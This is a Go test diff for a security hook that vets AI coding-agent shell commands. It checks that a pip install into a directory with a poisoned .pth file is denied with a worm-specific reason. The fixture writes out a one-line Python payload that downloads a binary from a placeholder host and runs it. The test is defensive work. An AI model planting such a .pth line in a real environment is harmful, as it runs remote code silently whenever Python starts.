@@ -179,6 +179,36 @@ func decodeDecision(t *testing.T, buf *bytes.Buffer) decision {
 	}
 }
 
+// TestRunClaudeCodeHook_PthWormPipTargetDeniesEarly mirrors
+// TestRunClaudeCodeHook_BindingGypWormPrefixTargetDeniesEarly for Python:
+// a `pip install --target <dir>` whose target tree contains a poisoned
+// .pth must be denied on the Hades worm reason before the generic
+// "re-run with veto" nudge, because prefixing with veto would not make
+// the already-poisoned tree safe to install into.
+func TestRunClaudeCodeHook_PthWormPipTargetDeniesEarly(t *testing.T) {
+	withVetoOnPath(t)
+	cwd := t.TempDir()
+	target := t.TempDir()
+	chdirForTest(t, cwd)
+
+	// Poison a .pth inside target's venv — NOT in cwd, so the test
+	// exercises flag-based root resolution and not just the cwd fallback.
+	site := filepath.Join(target, ".venv", "lib", "python3.11", "site-packages")
+	writePth(t, filepath.Join(site, "ensmallen-setup.pth"),
+		`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n")
+
+	in := encodePayload(t, "Bash", "pip install --target "+target+" requests")
+	var out bytes.Buffer
+	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
+	require.Equal(t, exitOK, rc)
+
+	d := decodeDecision(t, &out)
+	require.Equal(t, "deny", d.PermissionDecision)
+	require.Contains(t, d.PermissionDecisionReason, "Hades")
+	// Must NOT be the generic prefix nudge — the worm reason supersedes it.
+	require.NotContains(t, d.PermissionDecisionReason, "Re-run with an explicit")
+}
+
 func TestClaudeCodeHookDeniesPipInstallInPoisonedVenv(t *testing.T) {
 	root := t.TempDir()
 	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
